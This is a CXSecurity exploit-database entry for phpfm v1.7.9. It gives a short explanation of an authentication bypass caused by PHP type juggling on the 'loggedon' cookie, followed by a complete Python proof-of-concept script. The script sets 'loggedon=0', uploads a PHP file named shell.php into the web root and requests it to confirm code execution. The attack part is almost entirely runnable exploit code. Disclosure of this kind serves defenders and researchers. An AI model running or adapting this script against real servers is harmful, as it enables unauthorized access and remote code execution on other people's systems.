---
title: phpfm v1.7.9 Authentication type juggling
url: https://cxsecurity.com/issue/WLB-2023070087
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-08-01
fetch_date: 2025-10-06T16:58:41.285496
---

# phpfm v1.7.9 Authentication type juggling

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **phpfm v1.7.9 Authentication type juggling** **2023.07.31**  Credit:  **[thoughtfault](https://cxsecurity.com/author/thoughtfault/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: phpfm v1.7.9 - Authentication type juggling
# Date: 2023-07-10
# Exploit Author: thoughtfault
# Vendor Homepage: https://www.dulldusk.com/phpfm/
# Software Link: https://github.com/dulldusk/phpfm/
# Version: 1.6.1-1.7.9
# Tested on: Ubuntu 22.04
# CVE : N/A
"""
An authentication bypass exists in when the hash of the password selected by the user incidently begins with 0e, 00e, and in some PHP versions, 0x. This is because loose type comparision is performed between the password hash and the loggedon value, which by default for an unauthenticated user is 0 and can additionally be controlled by the attacker. This allows an attacker to bypass the login and obtain remote code execution.
A list of vulnerable password hashes can be found here.
https://github.com/spaze/hashes/blob/master/md5.md
"""
import requests
import sys
if len(sys.argv) < 2:
print(f"[\*] Syntax: ./{\_\_file\_\_} http://target/")
sys.exit(0)
url = sys.argv[1].rstrip('/') + "/index.php"
payload\_name = "shell.php"
payload = '<?php echo "I am a shell"; ?>'
payload\_url = url.replace("index.php", payload\_name)
headers = {"Accept-Language": "en-US,en;q=0.5", "Cookie": "loggedon=0"}
files = {"dir\_dest": (None, "/srv/http/"), "action": (None, "10"), "upfiles[]": ("shell.php", payload) }
requests.post(url, headers=headers, files=files)
r = requests.get(payload\_url)
if r.status\_code == 200:
print(f"[\*] Exploit sucessfull: {payload\_url}")
print(r.text)
else:
print(f"[\*] Exploit might have failed, payload url returned a non-200 status code of: {r.status\_code}" )

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023070087)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top